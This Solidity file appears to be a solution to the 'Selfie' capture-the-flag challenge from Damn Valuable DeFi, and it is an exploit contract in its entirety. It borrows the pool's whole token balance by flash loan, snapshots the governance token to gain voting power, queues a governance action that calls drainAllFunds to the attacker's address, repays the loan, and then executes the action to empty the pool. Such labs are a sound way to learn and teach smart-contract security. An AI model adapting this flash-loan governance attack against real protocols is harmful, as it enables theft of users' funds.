// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract MaliciousContractSelfie {

    address public attacker;
    SelfiePool public immutable selfiePool;
    SimpleGovernance public immutable simpleGovernance;
    DamnValuableTokenSnapshot public immutable liquidityToken;
    uint256 actionId;

    constructor(address _selfiePool, address _liquidityToken, address _gov) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_gov);
        liquidityToken = DamnValuableTokenSnapshot(_liquidityToken);
        attacker = msg.sender;
    }

    function attack() external {
        // Get a flash-loan
        uint256 selfiePoolBalance = liquidityToken.balanceOf(address(selfiePool));
        selfiePool.flashLoan(selfiePoolBalance);
    }

    function receiveTokens(address, uint256 amount) external {
        // Create a snapshot
        liquidityToken.snapshot();

        // queueAction
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0);

        // Return the flash-loan
        liquidityToken.transfer(address(selfiePool), amount);
    }

    function drainToAttacker() external {
        simpleGovernance.executeAction(actionId);
    }
}